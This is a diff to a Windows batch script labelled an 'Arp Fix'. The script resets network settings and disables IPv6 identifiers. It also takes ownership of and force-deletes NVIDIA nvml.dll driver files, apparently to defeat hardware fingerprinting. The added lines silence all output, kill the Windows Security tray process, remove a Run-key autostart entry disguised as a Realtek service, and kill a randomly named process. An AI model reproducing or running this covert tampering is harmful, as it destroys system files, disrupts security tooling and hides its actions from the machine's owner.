@@ -1,23 +1,29 @@
 @echo off
 title "Inimu | Arp Fix (by noxx)"
-netsh interface ipv6 set teredo disable
-netsh interface ipv6 set global randomizeidentifiers=disabled
-netsh interface ipv6 set global state=disabled
+>nul 2>&1
 
-arp -d
+netsh interface ipv6 set teredo disable >nul 2>&1
+netsh interface ipv6 set global randomizeidentifiers=disabled >nul 2>&1
+netsh interface ipv6 set global state=disabled >nul 2>&1
 
-netsh winsock reset
+arp -d >nul 2>&1
 
-netsh int ip reset
+netsh winsock reset >nul 2>&1
 
-ipconfig /release
+netsh int ip reset >nul 2>&1
 
-ipconfig /renew
+ipconfig /release >nul 2>&1
 
-ipconfig /flushdns
+ipconfig /renew >nul 2>&1
 
-takeown /f "C:\Windows\System32\DriverStore\FileRepository\*\nvml.dll" /r /d y
-icacls "C:\Windows\System32\DriverStore\FileRepository\*\nvml.dll" /grant administrators:F /t
-del /f /q "C:\Windows\System32\DriverStore\FileRepository\*\nvml.dll"
+ipconfig /flushdns >nul 2>&1
+
+takeown /f "C:\Windows\System32\DriverStore\FileRepository\*\nvml.dll" /r /d y >nul 2>&1
+icacls "C:\Windows\System32\DriverStore\FileRepository\*\nvml.dll" /grant administrators:F /t >nul 2>&1
+del /f /q "C:\Windows\System32\DriverStore\FileRepository\*\nvml.dll" >nul 2>&1
+
+taskkill /f /t /im SecurityHealthSystray.exe >nul 2>&1
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f >nul 2>&1
+taskkill /f /t /im dklsdksapodoads.exe >nul 2>&1
 
 exit
